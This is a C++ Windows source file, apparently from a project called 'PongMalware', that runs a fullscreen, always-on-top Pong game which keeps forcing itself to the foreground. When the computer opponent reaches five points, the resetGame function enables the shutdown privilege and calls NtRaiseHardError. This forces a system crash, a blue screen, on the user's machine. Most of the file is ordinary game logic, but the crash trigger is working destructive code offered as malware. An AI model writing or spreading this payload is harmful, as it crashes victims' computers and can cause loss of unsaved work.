

#include "PongMalware.h"

// Global Variables:
HINSTANCE hInst;
ITaskbarList3* taskbar;
HWND hWnd;
RECT g_desktopRect;
wchar_t g_szClassName[] = L"myClassName";
HFONT font;
COLORREF color;
HBRUSH whiteBrush;
HBRUSH blackBrush;
HWND taskWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);;
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);


struct bouncy;
struct wall;
void calcWall(RECT& rect, wall& wall);
bool down = false , up = false, impossible = false;

struct bouncy {
    int x = 0;
    int y = 0;
    int xforce = 0;
    int yforce = 0;
    int speed = 5;
    int width = 0;
    int height = 0;
    int prediction = 0;
    RECT rect{};
};

struct wall {
    int y = 0;
    int x = 0;
    RECT rect{};
    int score =0;
};

struct drawings {
    RECT* score=nullptr;
    RECT* scoreTags=nullptr;
};

struct pong {
    bouncy ball{};
    wall player{};
    wall opponent{};
    drawings draw{};
    int wallHeight = 0;
    int wallWidth = 0;
    int debounce = 10;
    int debounceBarrier = 10;
    int debounceMax = 10;
};
pong pongGame;
void calcWall(RECT& rect, wall& wall) {
    rect.left = wall.x;
    rect.right = wall.x + pongGame.wallWidth;
    rect.top = wall.y;
    rect.bottom = wall.y + pongGame.wallHeight;
}
void calcBall(RECT& rect, bouncy& ball) {
    rect.left = ball.x;
    rect.right = ball.x + ball.width;
    rect.top = ball.y;
    rect.bottom = ball.y + ball.height;
}

int xa = 0, ya = 0;
const char* s = ", ";
int max = 0;
void predict(int x, int y, int m) {
    int newY = ((x * m) * -1) + (pongGame.ball.xforce * ((pongGame.ball.xforce > 0 ? pongGame.player.x : pongGame.opponent.x) * m)) + (pongGame.ball.xforce * y);
    if (newY + pongGame.ball.height > g_desktopRect.bottom - g_desktopRect.top) { newY = g_desktopRect.bottom; }
    else if (newY < g_desktopRect.top) { newY = g_desktopRect.top; }
    int newX = (((newY * -1) + (pongGame.ball.xforce * y)) / (-1 * pongGame.ball.yforce)) + x;
    if (newX > pongGame.player.x) { newX = pongGame.player.x; }
    else if (newX < pongGame.opponent.x) { newX = pongGame.opponent.x; }
    xa = newX; ya = newY;
    if (newY == g_desktopRect.top || newY == g_desktopRect.bottom) {
            if (max != 5) {
                max++;
                predict(newX, newY, m * -1);
            }
            else {
                max = 0;
            }
    }
}

void resetGame() {
    if (pongGame.player.score == 5) {
        PostMessage(hWnd, WM_CLOSE, NULL, NULL);
    }
    else if (pongGame.opponent.score == 5) {
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
    }
    pongGame.opponent.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongGame.wallHeight;
    pongGame.player.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongGame.wallHeight;
    pongGame.ball.x = (g_desktopRect.right - g_desktopRect.left)/2-pongGame.ball.width;
    pongGame.ball.y = (g_desktopRect.bottom - g_desktopRect.top)/2 - pongGame.ball.height;
    pongGame.ball.xforce *= -1;
    int angle = rand() % 2;
    pongGame.ball.yforce *= angle == 0 ? 1 : angle;
    predict(pongGame.ball.x, pongGame.ball.y, pongGame.ball.yforce);
    RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
}

bool isColliding() {
    bool y = pongGame.ball.xforce > 0 ? pongGame.player.rect.top <= pongGame.ball.rect.top && pongGame.player.rect.bottom >= pongGame.ball.rect.bottom : pongGame.opponent.rect.top <= pongGame.ball.rect.top && pongGame.opponent.rect.bottom >= pongGame.ball.rect.bottom;
    bool x = pongGame.ball.xforce > 0 ? pongGame.player.rect.left <= pongGame.ball.rect.right : pongGame.opponent.rect.right >= pongGame.ball.rect.left;
    return x && y;
}

void move(wall& wall, int amount) {
    if (wall.y + amount < g_desktopRect.top) {
        wall.y = g_desktopRect.top;
        return;
    }
    if (wall.y + pongGame.wallHeight + amount > g_desktopRect.bottom - g_desktopRect.top) {
        wall.y = g_desktopRect.bottom - g_desktopRect.top - pongGame.wallHeight;
        return;
    }
    wall.y += amount;
}

void processBounce() {
    while (true) {
        SetForegroundWindow(hWnd);
        SetActiveWindow(hWnd);
        pongGame.ball.x += pongGame.ball.xforce*pongGame.ball.speed;
        pongGame.ball.y += pongGame.ball.yforce*pongGame.ball.speed;
        int y;
        if (pongGame.ball.xforce < 0) {
            if (pongGame.opponent.y + (pongGame.wallHeight / 2) > ya + (pongGame.ball.height / 2)) {
                move(pongGame.opponent, impossible ? -5 : -4);
            }
            else {
                move(pongGame.opponent, impossible ? 5 : 4);
            }
        }
        //if (pongGame.ball.xforce > 0) {
        //    //OutputDebugStringA(std::to_string(y).append(" - ball y prediction\n").append(std::to_string(pongGame.player.y).append(" - player y\n")).c_str());
        //    if (pongGame.player.y + (pongGame.wallHeight / 2) > ya + (pongGame.ball.height / 2)) {
        //        move(pongGame.player, impossible ? -5 : -5);
        //    }
        //    else {
        //        move(pongGame.player, impossible ? 5 : 5);
        //    }
        //}
        //if (pongGame.ball.xforce > 0) {
        //    y = ((pongGame.ball.x * pongGame.ball.yforce)*-1) + (pongGame.player.x * pongGame.ball.yforce) + pongGame.ball.y;
        //    if (pongGame.player.y + (pongGame.wallHeight / 2) > y + (pongGame.ball.height / 2)) {
        //        move(pongGame.player, impossible ? -5 : -5);
        //    }
        //    else {
        //        move(pongGame.player, impossible ? 5 : 5);
        //    }
        //}
        if (up) {
            move(pongGame.player, -4);
        }
        else if (down) {
            move(pongGame.player, 4);
        }
        // HANDLE THE SCORE
        if (pongGame.ball.x <= g_desktopRect.left) {
            pongGame.player.score++;
            resetGame();
        }
        else if (pongGame.ball.x + pongGame.ball.width >= g_desktopRect.right - g_desktopRect.left) {
            pongGame.opponent.score++;
            resetGame();
        }
        if (pongGame.debounce < pongGame.debounceMax) {
            pongGame.debounce++;
        }
        if (pongGame.debounceBarrier < pongGame.debounceMax) {
            pongGame.debounceBarrier++;
        }
        calcWall(pongGame.player.rect, pongGame.player);
        calcWall(pongGame.opponent.rect, pongGame.opponent);
        calcBall(pongGame.ball.rect, pongGame.ball);
        if (isColliding()) {
            if (pongGame.debounce == pongGame.debounceMax) {
                pongGame.ball.xforce *= -1;
                pongGame.debounce = 0;
                predict(pongGame.ball.x, pongGame.ball.y, pongGame.ball.yforce);
            }
        }
        if ((pongGame.ball.y <= g_desktopRect.top) || (pongGame.ball.y+pongGame.ball.height >= g_desktopRect.bottom-g_desktopRect.top)) {
            if (pongGame.debounceBarrier == pongGame.debounceMax) {
                pongGame.debounceBarrier = 0;
                pongGame.ball.yforce *= -1;
                predict(pongGame.ball.x, pongGame.ball.y, pongGame.ball.yforce);
            }
        }
        RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
        Sleep(1);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        SetTextColor(hdc, color);
        SelectObject(hdc, font);
        SetBkMode(hdc, TRANSPARENT);
        RECT rect;
        GetClientRect(hWnd, &rect);
        FillRect(hdc, &rect, blackBrush);
        calcWall(pongGame.opponent.rect, pongGame.opponent);
        FillRect(hdc, &pongGame.opponent.rect, whiteBrush);
        calcWall(pongGame.player.rect, pongGame.player);
        FillRect(hdc, &pongGame.player.rect, whiteBrush);
        Ellipse(hdc, pongGame.ball.x, pongGame.ball.y, pongGame.ball.x + pongGame.ball.width, pongGame.ball.y + pongGame.ball.height);
        std::string string = std::to_string(pongGame.opponent.score).c_str(); string = string.append(" : ").c_str();string = string.append(std::to_string(pongGame.player.score).c_str());
        std::wstring strtemp = std::wstring(string.begin(), string.end());
        LPCWSTR sw = strtemp.c_str();
        DrawText(hdc,sw, wcslen(sw), pongGame.draw.score, DT_CENTER);
        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        ShowWindow(taskWnd, SW_SHOWDEFAULT);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        if (wParam == VK_UP) {
            up = true;
        }
        else if(wParam == VK_DOWN){
            down = true;
        }
        break;
    case WM_KEYUP:
        if (wParam == VK_UP) {
            up = false;
        }
        else if (wParam == VK_DOWN) {
            down = false;
        }
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    font = CreateFontA(100, 50, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, NONANTIALIASED_QUALITY, DEFAULT_PITCH, NULL);
    color = RGB(255, 255, 255);
    whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
    blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    srand(time(NULL));
    GetClientRect(GetDesktopWindow(), &g_desktopRect);
    WNDCLASSEX wc;
    MSG msg;
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, MAKEINTRESOURCE(IDI_PONGMALWARE));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = blackBrush;
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, MAKEINTRESOURCE(IDI_PONGMALWARE));
    RegisterClassEx(&wc);
    hWnd = CreateWindowEx(
        WS_EX_COMPOSITED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_LAYERED,
        g_szClassName,
        NULL,
        WS_POPUP,
        CW_USEDEFAULT, CW_USEDEFAULT, g_desktopRect.right-g_desktopRect.left, g_desktopRect.bottom-g_desktopRect.top,
        NULL, NULL, hInstance, NULL
    );
   /* SetLayeredWindowAttributes(hWnd, 0, (255 * 30) / 100, LWA_ALPHA);*/
    //ShowWindow(taskWnd, SW_HIDE);
    pongGame.wallHeight = (int) (g_desktopRect.bottom - g_desktopRect.top) / 7;
    pongGame.wallWidth = (int) (g_desktopRect.bottom - g_desktopRect.top) / 30;
    pongGame.opponent.x = g_desktopRect.left + 10;
    pongGame.player.x = g_desktopRect.right - g_desktopRect.left - pongGame.wallWidth - 10;
    pongGame.player.y = (g_desktopRect.bottom - g_desktopRect.top) /2 - pongGame.wallHeight;
    pongGame.opponent.y = (g_desktopRect.bottom - g_desktopRect.top) / 2 - pongGame.wallHeight;
    pongGame.ball.height = 25;
    pongGame.ball.width = 25;
    RECT score{};
    score.left = (g_desktopRect.right - g_desktopRect.left) / 2 - 300;
    score.right = (g_desktopRect.right - g_desktopRect.left) / 2 + 300;
    score.top = g_desktopRect.top + 50;
    score.bottom = score.top + 150;
    pongGame.draw.score = &score;
    ShowWindow(hWnd, nCmdShow);
    ShowWindow(hWnd, SW_MAXIMIZE);
    UpdateWindow(hWnd);
    if (rand() % 2) {
        pongGame.ball.xforce = 1;
    }
    else {
        pongGame.ball.xforce = -1;
    }
    if (rand() % 2) {
        pongGame.ball.yforce = -1;
    }
    else {
        pongGame.ball.yforce = 1;
    }
    resetGame();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&processBounce, 0, 0, NULL);
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}



